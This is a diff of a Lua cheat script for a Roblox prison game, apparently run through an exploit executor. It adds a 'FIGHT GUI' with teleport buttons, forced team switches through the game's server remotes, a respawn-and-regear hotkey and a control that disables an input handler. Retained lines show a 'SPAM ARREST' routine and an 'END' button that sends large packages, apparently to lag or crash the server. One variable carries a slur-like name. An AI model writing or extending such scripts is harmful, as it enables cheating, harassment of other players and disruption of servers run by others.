-	CRIM.Parent = FightGui
-	CRIM.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	CRIM.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	CRIM.Position = UDim2.new(0.385522425, 0, 0.275802702, 0)
-	CRIM.Size = UDim2.new(0, 63, 0, 25)
-	CRIM.Font = Enum.Font.SourceSans
-	CRIM.Text = "BASE"
-	CRIM.TextColor3 = Color3.fromRGB(255, 255, 255)
-	CRIM.TextSize = 14.000
-	CRIM.MouseButton1Down:connect(function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-943, 95, 2056)
-	end)
-
-	ARMORY.Name = "ARMORY"
-	ARMORY.Parent = FightGui
-	ARMORY.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	ARMORY.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	ARMORY.Position = UDim2.new(0.389267921, 0, 0.209494904, 0)
-	ARMORY.Size = UDim2.new(0, 63, 0, 25)
-	ARMORY.Font = Enum.Font.SourceSans
-	ARMORY.Text = "ARMORY"
-	ARMORY.TextColor3 = Color3.fromRGB(255, 255, 255)
-	ARMORY.TextSize = 14.000
-	ARMORY.MouseButton1Down:connect(function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(798,99,2260)
-	end)
-
-
-	YARD.Name = "YARD"
-	YARD.Parent = FightGui
-	YARD.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	YARD.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	YARD.Position = UDim2.new(0.150180101, 0, 0.344683677, 0)
-	YARD.Size = UDim2.new(0, 63, 0, 25)
-	YARD.Font = Enum.Font.SourceSans
-	YARD.Text = "YARD"
-	YARD.TextColor3 = Color3.fromRGB(255, 255, 255)
-	YARD.TextSize = 14.000
-	YARD.MouseButton1Down:connect(function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(778, 98, 2465)
-	end)
-
-	CAFE.Name = "CAFE"
-	CAFE.Parent = FightGui
-	CAFE.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	CAFE.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	CAFE.Position = UDim2.new(0.149567127, 0, 0.207302034, 0)
-	CAFE.Size = UDim2.new(0, 63, 0, 25)
-	CAFE.Font = Enum.Font.SourceSans
-	CAFE.Text = "CAFE"
-	CAFE.TextColor3 = Color3.fromRGB(255, 255, 255)
-	CAFE.TextSize = 14.000
-	CAFE.MouseButton1Down:connect(function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(879, 99, 2247)
-	end)
-
-	CELLS.Name = "CELLS"
-	CELLS.Parent = FightGui
-	CELLS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	CELLS.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	CELLS.Position = UDim2.new(0.149567127, 0, 0.277087986, 0)
-	CELLS.Size = UDim2.new(0, 63, 0, 25)
-	CELLS.Font = Enum.Font.SourceSans
-	CELLS.Text = "CELLS"
-	CELLS.TextColor3 = Color3.fromRGB(255, 255, 255)
-	CELLS.TextSize = 14.000
-	CELLS.MouseButton1Down:connect(function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(917, 100, 2415)
-	end)
-
-	CRIMT.Name = "CRIMT"
-	CRIMT.Parent = FightGui
-	CRIMT.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	CRIMT.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	CRIMT.Position = UDim2.new(0.265672386, 0, 0.603493273, 0)
-	CRIMT.Size = UDim2.new(0, 63, 0, 25)
-	CRIMT.Font = Enum.Font.SourceSans
-	CRIMT.Text = "CRIMINAL"
-	CRIMT.TextColor3 = Color3.fromRGB(255, 255, 255)
-	CRIMT.TextSize = 14.000
-	CRIMT.MouseButton1Down:connect(function()
-		local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
-		LCS = game.Workspace["Criminals Spawn"].SpawnLocation
-		LCS.CanCollide = false
-		LCS.Size = Vector3.new(51.05, 24.12, 54.76)
-		LCS.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-		LCS.Transparency = 1
-		wait(0.5)
-		LCS.CFrame = CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
-		LCS.Size = Vector3.new(6, 0.2, 6)
-		LCS.Transparency = 0
-		wait()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
-	end)
-
-	-- Scripts:
-
-	local function CGEAE_fake_script() -- FightGui.OpenF 
-		local script = Instance.new('LocalScript', FightGui)
-
-		player = game.Players.LocalPlayer
-
-		player:GetMouse().KeyDown:Connect(function(key)
-			if key == "e" and script.Parent.Visible == false then
-				script.Parent.Visible = true
-			else
-				if key == "e" and script.Parent.Visible == true then
-					script.Parent.Visible = false
+		game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(key)
+			if key == "z" then
+				if (game.Players.LocalPlayer.Team.Name ~= "Criminals") then
+					local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
+					local plr = game.Players.LocalPlayer.Name
+					local gayevent = game:GetService("Workspace").Remote.loadchar
+					gayevent:InvokeServer(plr)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
+				else
+					local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
+					Workspace.Remote.TeamEvent:FireServer("Bright orange")
+					wait()
+					local plr = game.Players.LocalPlayer.Name
+					local gayevent = game:GetService("Workspace").Remote.loadchar
+					gayevent:InvokeServer(plr)
+					LCS = game.Workspace["Criminals Spawn"].SpawnLocation
+					LCS.CanCollide = false
+					LCS.Size = Vector3.new(51.05, 24.12, 54.76)
+					LCS.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+					LCS.Transparency = 1
+					wait(0.5)
+					LCS.CFrame = CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+					LCS.Size = Vector3.new(6, 0.2, 6)
+					LCS.Transparency = 0
+					wait()
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
 				end
+				wait(0.1)
+				if game.Players.LocalPlayer.Team.Name == "Criminals" then 
+					if game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") then return end
+				end
+				getGuns()
 			end
 		end)
 
+		COLOR.Name = "COLOR"
+		COLOR.Parent = FightGui
+		COLOR.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		COLOR.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		COLOR.Position = UDim2.new(0.497881413, 0, 0.530237734, 0)
+		COLOR.Size = UDim2.new(0, 63, 0, 25)
+		COLOR.Font = Enum.Font.SourceSans
+		COLOR.Text = "COLOR"
+		COLOR.TextColor3 = Color3.fromRGB(255, 255, 255)
+		COLOR.TextSize = 14.000
 
+		CAFE.Name = "CAFE"
+		CAFE.Parent = FightGui
+		CAFE.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		CAFE.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		CAFE.Position = UDim2.new(0.14582181, 0, 0.166979462, 0)
+		CAFE.Size = UDim2.new(0, 63, 0, 25)
+		CAFE.Font = Enum.Font.SourceSans
+		CAFE.Text = "CAFE"
+		CAFE.TextColor3 = Color3.fromRGB(255, 255, 255)
+		CAFE.TextSize = 14.000
+		CAFE.MouseButton1Down:connect(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(879, 99, 2247)
+		end)
+
+
+		NEXUS.Name = "NEXUS"
+		NEXUS.Parent = FightGui
+		NEXUS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		NEXUS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		NEXUS.Position = UDim2.new(0.389267206, 0, 0.304431289, 0)
+		NEXUS.Size = UDim2.new(0, 63, 0, 25)
+		NEXUS.Font = Enum.Font.SourceSans
+		NEXUS.Text = "NEXUS"
+		NEXUS.TextColor3 = Color3.fromRGB(255, 255, 255)
+		NEXUS.TextSize = 14.000
+		NEXUS.MouseButton1Down:connect(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(917, 100, 2387)
+		end)
+
+
+		LOCK.Name = "LOCK"
+		LOCK.Parent = FightGui
+		LOCK.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		LOCK.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		LOCK.Position = UDim2.new(0.29829967, 0, 0.688666642, 0)
+		LOCK.Size = UDim2.new(0, 108, 0, 25)
+		LOCK.Font = Enum.Font.SourceSans
+		LOCK.Text = "LOCK"
+		LOCK.TextColor3 = Color3.fromRGB(255, 255, 255)
+		LOCK.TextSize = 14.000
+		LOCK.MouseButton1Down:connect(function()
+			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
+			game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+			game.Players.LocalPlayer.CharacterAdded:connect(function()
+				game.Workspace:WaitForChild(game.Players.LocalPlayer.Name)
+				game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
+			end)
+		end)
+
+		PVPTEXT.Name = "PVPTEXT"
+		PVPTEXT.Parent = FightGui
+		PVPTEXT.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		PVPTEXT.BackgroundTransparency = 1.000
+		PVPTEXT.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		PVPTEXT.Position = UDim2.new(0.431014895, 0, 0.624220669, 0)
+		PVPTEXT.Size = UDim2.new(0, 40, 0, 24)
+		PVPTEXT.Font = Enum.Font.SourceSans
+		PVPTEXT.Text = "PVP"
+		PVPTEXT.TextColor3 = Color3.fromRGB(255, 255, 255)
+		PVPTEXT.TextSize = 14.000
+
+		NOSHIELD.Name = "NOSHIELD"
+		NOSHIELD.Parent = FightGui
+		NOSHIELD.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		NOSHIELD.BackgroundTransparency = 1.000
+		NOSHIELD.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		NOSHIELD.Position = UDim2.new(0.293727636, 0, 0.399951667, 0)
+		NOSHIELD.Size = UDim2.new(0, 107, 0, 24)
+		NOSHIELD.Font = Enum.Font.SourceSans
+		NOSHIELD.Text = "TEAMS"
+		NOSHIELD.TextColor3 = Color3.fromRGB(255, 255, 255)
+		NOSHIELD.TextSize = 14.000
+
+		CELLS.Name = "CELLS"
+		CELLS.Parent = FightGui
+		CELLS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		CELLS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		CELLS.Position = UDim2.new(0.14582181, 0, 0.236765414, 0)
+		CELLS.Size = UDim2.new(0, 63, 0, 25)
+		CELLS.Font = Enum.Font.SourceSans
+		CELLS.Text = "CELLS"
+		CELLS.TextColor3 = Color3.fromRGB(255, 255, 255)
+		CELLS.TextSize = 14.000
+		CELLS.MouseButton1Down:connect(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(917, 100, 2415)
+		end)
+
+		NOSHIELD_2.Name = "NOSHIELD"
+		NOSHIELD_2.Parent = FightGui
+		NOSHIELD_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		NOSHIELD_2.BackgroundTransparency = 1.000
+		NOSHIELD_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		NOSHIELD_2.Position = UDim2.new(0.286237121, 0, 0.103520773, 0)
+		NOSHIELD_2.Size = UDim2.new(0, 107, 0, 24)
+		NOSHIELD_2.Font = Enum.Font.SourceSans
+		NOSHIELD_2.Text = "TELEPORTS"
+		NOSHIELD_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+		NOSHIELD_2.TextSize = 14.000
+
+		ROOF.Name = "ROOF"
+		ROOF.Parent = FightGui
+		ROOF.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		ROOF.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		ROOF.Position = UDim2.new(0.625222802, 0, 0.167392492, 0)
+		ROOF.Size = UDim2.new(0, 63, 0, 25)
+		ROOF.Font = Enum.Font.SourceSans
+		ROOF.Text = "ROOF"
+		ROOF.TextColor3 = Color3.fromRGB(255, 255, 255)
+		ROOF.TextSize = 14.000
+		ROOF.MouseButton1Down:connect(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(848,118,2332)
+		end)
+
+		PVPTP.Name = "PVPTP"
+		PVPTP.Parent = FightGui
+		PVPTP.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		PVPTP.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		PVPTP.Position = UDim2.new(0.62522316, 0, 0.235243917, 0)
+		PVPTP.Size = UDim2.new(0, 63, 0, 25)
+		PVPTP.Font = Enum.Font.SourceSans
+		PVPTP.Text = "PVP"
+		PVPTP.TextColor3 = Color3.fromRGB(255, 255, 255)
+		PVPTP.TextSize = 14.000
+		PVPTP.MouseButton1Down:connect(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-770, 11, 1491)
+		end)
+
+		CRIM.Name = "CRIM"
+		CRIM.Parent = FightGui
+		CRIM.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		CRIM.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		CRIM.Position = UDim2.new(0.381777108, 0, 0.23548013, 0)
+		CRIM.Size = UDim2.new(0, 63, 0, 25)
+		CRIM.Font = Enum.Font.SourceSans
+		CRIM.Text = "BASE"
+		CRIM.TextColor3 = Color3.fromRGB(255, 255, 255)
+		CRIM.TextSize = 14.000
+		CRIM.MouseButton1Down:connect(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-943, 95, 2056)
+		end)
+
+		ARMORY.Name = "ARMORY"
+		ARMORY.Parent = FightGui
+		ARMORY.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		ARMORY.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		ARMORY.Position = UDim2.new(0.385522604, 0, 0.169172317, 0)
+		ARMORY.Size = UDim2.new(0, 63, 0, 25)
+		ARMORY.Font = Enum.Font.SourceSans
+		ARMORY.Text = "ARMORY"
+		ARMORY.TextColor3 = Color3.fromRGB(255, 255, 255)
+		ARMORY.TextSize = 14.000
+		ARMORY.MouseButton1Down:connect(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(798,99,2260)
+		end)
+
+		YARD.Name = "YARD"
+		YARD.Parent = FightGui
+		YARD.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		YARD.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		YARD.Position = UDim2.new(0.146434784, 0, 0.304361105, 0)
+		YARD.Size = UDim2.new(0, 63, 0, 25)
+		YARD.Font = Enum.Font.SourceSans
+		YARD.Text = "YARD"
+		YARD.TextColor3 = Color3.fromRGB(255, 255, 255)
+		YARD.TextSize = 14.000
+		YARD.MouseButton1Down:connect(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(778, 98, 2465)
+		end)
+
+		GUARDS.Name = "GUARDS"
+		GUARDS.Parent = FightGui
+		GUARDS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		GUARDS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		GUARDS.Position = UDim2.new(0.617215753, 0, 0.463506132, 0)
+		GUARDS.Size = UDim2.new(0, 63, 0, 25)
+		GUARDS.Font = Enum.Font.SourceSans
+		GUARDS.Text = "GUARDS"
+		GUARDS.TextColor3 = Color3.fromRGB(255, 255, 255)
+		GUARDS.TextSize = 14.000
+		GUARDS.MouseButton1Down:connect(function()
+			local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
+			workspace.Remote.loadchar:InvokeServer("", "Bright blue")
+			wait()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
+		end)
+
+		NEUTRAL.Name = "NEUTRAL"
+		NEUTRAL.Parent = FightGui
+		NEUTRAL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		NEUTRAL.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		NEUTRAL.Position = UDim2.new(0.381776571, 0, 0.465721637, 0)
+		NEUTRAL.Size = UDim2.new(0, 63, 0, 25)
+		NEUTRAL.Font = Enum.Font.SourceSans
+		NEUTRAL.Text = "NEUTRAL"
+		NEUTRAL.TextColor3 = Color3.fromRGB(255, 255, 255)
+		NEUTRAL.TextSize = 14.000
+		NEUTRAL.MouseButton1Down:connect(function()
+			Workspace.Remote.TeamEvent:FireServer("Medium stone grey")
+		end)
+
+		INMATE.Name = "INMATE"
+		INMATE.Parent = FightGui
+		INMATE.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		INMATE.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		INMATE.Position = UDim2.new(0.138944149, 0, 0.465651423, 0)
+		INMATE.Size = UDim2.new(0, 63, 0, 25)
+		INMATE.Font = Enum.Font.SourceSans
+		INMATE.Text = "INMATE"
+		INMATE.TextColor3 = Color3.fromRGB(255, 255, 255)
+		INMATE.TextSize = 14.000
+		INMATE.MouseButton1Down:connect(function()
+			Workspace.Remote.TeamEvent:FireServer("Bright orange")
+		end)
+
+		NAMEGUI.Name = "NAMEGUI"
+		NAMEGUI.Parent = FightGui
+		NAMEGUI.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
+		NAMEGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		NAMEGUI.Position = UDim2.new(0.0459721014, 0, 0.0141959861, 0)
+		NAMEGUI.Size = UDim2.new(0, 243, 0, 32)
+		NAMEGUI.Font = Enum.Font.SciFi
+		NAMEGUI.Text = "FIGHT GUI"
+		NAMEGUI.TextColor3 = Color3.fromRGB(255, 255, 255)
+		NAMEGUI.TextSize = 28.000
+
+		-- Scripts:
+
+		local function YVHNLPM_fake_script() -- FightGui.OpenF 
+			local script = Instance.new('LocalScript', FightGui)
+
+			player = game.Players.LocalPlayer
+
+			player:GetMouse().KeyDown:Connect(function(key)
+				if key == "e" and script.Parent.Visible == false then
+					script.Parent.Visible = true
+				else
+					if key == "e" and script.Parent.Visible == true then
+						script.Parent.Visible = false
+					end
+				end
+			end)
+
+
+		end
+		coroutine.wrap(YVHNLPM_fake_script)()
 	end
-	coroutine.wrap(CGEAE_fake_script)()
-
 end)
 
+--Properties:
+
+
+HAXE.Name = "HAXE"
+HAXE.Parent = game.CoreGui
+
+HAXE_2.Name = "HAXE"
+HAXE_2.Parent = HAXE
+HAXE_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+HAXE_2.BackgroundTransparency = 1.000
+HAXE_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+HAXE_2.Position = UDim2.new(0.0134483241, 0, 0.618040502, 0)
+HAXE_2.Size = UDim2.new(0, 404, 0, 300)
+HAXE_2.Active = true
+HAXE_2.Draggable = true
+
+maintwo.Name = "maintwo"
+maintwo.Parent = HAXE_2
+maintwo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+maintwo.BackgroundTransparency = 0.200
+maintwo.BorderColor3 = Color3.fromRGB(0, 0, 0)
+maintwo.BorderSizePixel = 3
+maintwo.Position = UDim2.new(0.681768894, 0, 0, 0)
+maintwo.Size = UDim2.new(0, 128, 0, 294)
+
+Buttons.Name = "Buttons"
+Buttons.Parent = maintwo
+Buttons.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Buttons.BackgroundTransparency = 1.000
+Buttons.Position = UDim2.new(0.0694115162, 0, -0.00347497733, 0)
+Buttons.Size = UDim2.new(0, 110, 0, 289)
+
+CLOSEGUI.Name = "CLOSEGUI"
+CLOSEGUI.Parent = Buttons
+CLOSEGUI.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+CLOSEGUI.BackgroundTransparency = 0.500
+CLOSEGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CLOSEGUI.Position = UDim2.new(-0.00282526854, 0, 0.111892864, 0)
+CLOSEGUI.Size = UDim2.new(0, 107, 0, 24)
+CLOSEGUI.Font = Enum.Font.SourceSans
+CLOSEGUI.Text = "CLOSE GUI (Q)"
+CLOSEGUI.TextColor3 = Color3.fromRGB(255, 255, 255)
+CLOSEGUI.TextSize = 14.000
+
 ANTIABUSERS.Name = "ANTIABUSERS"
-ANTIABUSERS.Parent = maintwo
+ANTIABUSERS.Parent = Buttons
 ANTIABUSERS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 ANTIABUSERS.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ANTIABUSERS.Position = UDim2.new(0.0505130291, 0, 0.388397247, 0)
+ANTIABUSERS.Position = UDim2.new(-0.00531055313, 0, 0.461725652, 0)
 ANTIABUSERS.Size = UDim2.new(0, 107, 0, 25)
 ANTIABUSERS.Font = Enum.Font.SourceSans
 ANTIABUSERS.Text = "SPAM ARREST"
@@ -16109,37 +16110,79 @@ ANTIABUSERS.MouseButton1Down:connect(function()
 	arrest.MouseButton1Down:connect(function()
 		arr(FindPlayer(TextBox.Text))
 	end)
-
-
 end)
 
+FIGHTGUI.Name = "FIGHTGUI"
+FIGHTGUI.Parent = Buttons
+FIGHTGUI.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+FIGHTGUI.BackgroundTransparency = 0.500
+FIGHTGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
+FIGHTGUI.Position = UDim2.new(-0.00282526854, 0, 0.200453743, 0)
+FIGHTGUI.Size = UDim2.new(0, 107, 0, 24)
+FIGHTGUI.Font = Enum.Font.SourceSans
+FIGHTGUI.Text = "FIGHT GUI (E)"
+FIGHTGUI.TextColor3 = Color3.fromRGB(255, 255, 255)
+FIGHTGUI.TextSize = 14.000
 
-REJOIN.Name = "REJOIN"
-REJOIN.Parent = maintwo
-REJOIN.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-REJOIN.BorderColor3 = Color3.fromRGB(0, 0, 0)
-REJOIN.Position = UDim2.new(0.0661380291, 0, 0.735260785, 0)
-REJOIN.Size = UDim2.new(0, 107, 0, 25)
-REJOIN.Font = Enum.Font.SourceSans
-REJOIN.Text = "REJOIN"
-REJOIN.TextColor3 = Color3.fromRGB(255, 255, 255)
-REJOIN.TextSize = 14.000
-REJOIN.MouseButton1Down:connect(function()
-	game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+Subtitle.Name = "Subtitle"
+Subtitle.Parent = Buttons
+Subtitle.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
+Subtitle.BackgroundTransparency = 1.000
+Subtitle.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Subtitle.BorderSizePixel = 0
+Subtitle.Position = UDim2.new(7.21514225e-05, 0, 0.0133572184, 0)
+Subtitle.Size = UDim2.new(0, 107, 0, 27)
+Subtitle.Font = Enum.Font.RobotoMono
+Subtitle.Text = "CONTROLES"
+Subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+Subtitle.TextSize = 13.000
+Subtitle.TextWrapped = true
+
+Subtitle_2.Name = "Subtitle"
+Subtitle_2.Parent = Buttons
+Subtitle_2.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
+Subtitle_2.BackgroundTransparency = 1.000
+Subtitle_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Subtitle_2.BorderSizePixel = 0
+Subtitle_2.Position = UDim2.new(7.21514225e-05, 0, 0.368979692, 0)
+Subtitle_2.Size = UDim2.new(0, 107, 0, 27)
+Subtitle_2.Font = Enum.Font.RobotoMono
+Subtitle_2.Text = "SCRIPTS"
+Subtitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Subtitle_2.TextSize = 13.000
+Subtitle_2.TextWrapped = true
+
+BLACKLIST.Name = "BLACKLIST"
+BLACKLIST.Parent = Buttons
+BLACKLIST.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+BLACKLIST.BorderColor3 = Color3.fromRGB(0, 0, 0)
+BLACKLIST.Position = UDim2.new(-0.00654985197, 0, 0.550604403, 0)
+BLACKLIST.Size = UDim2.new(0, 107, 0, 25)
+BLACKLIST.Font = Enum.Font.SourceSans
+BLACKLIST.Text = "BLACKLIST"
+BLACKLIST.TextColor3 = Color3.fromRGB(255, 0, 0)
+BLACKLIST.TextSize = 14.000
+BLACKLIST.MouseButton1Down:connect(function()
+	if BLACKLIST.TextColor3 == Color3.fromRGB(255, 0, 0) then
+		BLACKLIST.TextColor3 = Color3.fromRGB(85, 255, 0)
+	else
+		if BLACKLIST.TextColor3 == Color3.fromRGB(85, 255, 0) then
+			BLACKLIST.TextColor3 = Color3.fromRGB(255, 0, 0)
+		end
+	end
 end)
 
-
-ENDS.Name = "ENDS"
-ENDS.Parent = maintwo
-ENDS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-ENDS.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ENDS.Position = UDim2.new(0.0656630993, 0, 0.864960313, 0)
-ENDS.Size = UDim2.new(0, 107, 0, 25)
-ENDS.Font = Enum.Font.SourceSans
-ENDS.Text = "END"
-ENDS.TextColor3 = Color3.fromRGB(255, 255, 255)
-ENDS.TextSize = 14.000
-ENDS.MouseButton1Down:connect(function()
+END.Name = "END"
+END.Parent = Buttons
+END.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+END.BorderColor3 = Color3.fromRGB(0, 0, 0)
+END.Position = UDim2.new(-0.00654984452, 0, 0.909457266, 0)
+END.Size = UDim2.new(0, 107, 0, 25)
+END.Font = Enum.Font.SourceSans
+END.Text = "END"
+END.TextColor3 = Color3.fromRGB(255, 255, 255)
+END.TextSize = 14.000	
+END.MouseButton1Down:connect(function()
 	local PackageSize = 100000 
 	local SendPackageAmountOfTimes = 5
 
@@ -16171,48 +16214,86 @@ ENDS.MouseButton1Down:connect(function()
 	end
 end)
 
-ANTIABUSERS_2.Name = "ANTIABUSERS"
-ANTIABUSERS_2.Parent = maintwo
-ANTIABUSERS_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-ANTIABUSERS_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ANTIABUSERS_2.Position = UDim2.new(0.0583255291, 0, 0.609799445, 0)
-ANTIABUSERS_2.Size = UDim2.new(0, 107, 0, 25)
-ANTIABUSERS_2.Font = Enum.Font.SourceSans
-ANTIABUSERS_2.Text = "XYZ"
-ANTIABUSERS_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-ANTIABUSERS_2.TextSize = 14.000
-ANTIABUSERS_2.MouseButton1Down:connect(function()
+REJOIN.Name = "REJOIN"
+REJOIN.Parent = Buttons
+REJOIN.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+REJOIN.BorderColor3 = Color3.fromRGB(0, 0, 0)
+REJOIN.Position = UDim2.new(-0.00531054474, 0, 0.820578635, 0)
+REJOIN.Size = UDim2.new(0, 107, 0, 25)
+REJOIN.Font = Enum.Font.SourceSans
+REJOIN.Text = "REJOIN"
+REJOIN.TextColor3 = Color3.fromRGB(255, 255, 255)
+REJOIN.TextSize = 14.000
+REJOIN.MouseButton1Down:connect(function()
+	game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+end)
+
+OTROS.Name = "OTROS"
+OTROS.Parent = Buttons
+OTROS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+OTROS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+OTROS.Position = UDim2.new(-0.00654984359, 0, 0.642855346, 0)
+OTROS.Size = UDim2.new(0, 107, 0, 25)
+OTROS.Font = Enum.Font.SourceSans
+OTROS.Text = "XYZ"
+OTROS.TextColor3 = Color3.fromRGB(255, 255, 255)
+OTROS.TextSize = 14.000
+OTROS.MouseButton1Down:connect(function()
 	local pl = game.Players.LocalPlayer.Character.HumanoidRootPart
 	print(pl.CFrame)
 end)
 
+Subtitle_3.Name = "Subtitle"
+Subtitle_3.Parent = Buttons
+Subtitle_3.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
+Subtitle_3.BackgroundTransparency = 1.000
+Subtitle_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Subtitle_3.BorderSizePixel = 0
+Subtitle_3.Position = UDim2.new(7.21514225e-05, 0, 0.728751898, 0)
+Subtitle_3.Size = UDim2.new(0, 107, 0, 27)
+Subtitle_3.Font = Enum.Font.RobotoMono
+Subtitle_3.Text = "SERVER"
+Subtitle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Subtitle_3.TextSize = 13.000
+Subtitle_3.TextWrapped = true
+
+RESPAWN.Name = "RESPAWN"
+RESPAWN.Parent = Buttons
+RESPAWN.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+RESPAWN.BackgroundTransparency = 0.500
+RESPAWN.BorderColor3 = Color3.fromRGB(0, 0, 0)
+RESPAWN.Position = UDim2.new(-0.00282526854, 0, 0.289014637, 0)
+RESPAWN.Size = UDim2.new(0, 107, 0, 24)
+RESPAWN.Font = Enum.Font.SourceSans
+RESPAWN.Text = "RESPAWN (Z)"
+RESPAWN.TextColor3 = Color3.fromRGB(255, 255, 255)
+RESPAWN.TextSize = 14.000
+
 FirstPage.Name = "FirstPage"
 FirstPage.Parent = HAXE_2
 FirstPage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-FirstPage.BackgroundTransparency = 0.250
+FirstPage.BackgroundTransparency = 0.200
